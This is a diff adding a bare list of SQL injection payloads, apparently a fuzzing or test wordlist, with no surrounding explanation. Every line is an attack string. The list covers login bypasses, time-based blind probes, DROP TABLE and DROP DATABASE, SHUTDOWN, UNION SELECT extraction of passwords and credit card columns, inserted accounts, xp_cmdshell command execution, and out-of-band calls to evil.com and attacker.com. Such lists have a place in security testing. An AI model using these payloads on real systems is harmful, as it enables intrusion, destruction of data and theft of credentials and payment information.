@@ -1,0 +1,27 @@
+' OR '1'='1
+" OR "1"="1
+admin' --
+' OR ''='
+' OR 1=1 --
+1 OR 1=1
+' OR sleep(5) --
+" OR sleep(5) --
+'; DROP TABLE users; --
+'; DROP DATABASE test; --
+'; UPDATE users SET admin=1 WHERE username='test';
+'; SHUTDOWN --
+1 UNION SELECT username, password FROM users --
+' OR EXISTS(SELECT * FROM users) --
+') OR ('1'='1
+') OR 1=1 --
+') UNION SELECT null, null, null --
+'||UTL_HTTP.request('http://evil.com')--
+'||UTL_INADDR.get_host_address('attacker.com')--
+1; DROP TABLE students;
+'; INSERT INTO accounts VALUES ('hack','pass');
+'; EXEC xp_cmdshell('dir');
+' OR benchmark(5000000,MD5(1)) --
+'||pg_sleep(5)--
+" UNION SELECT NULL --
+UNION SELECT ALL FROM users --
+UNION ALL SELECT credit_card FROM payment_info --
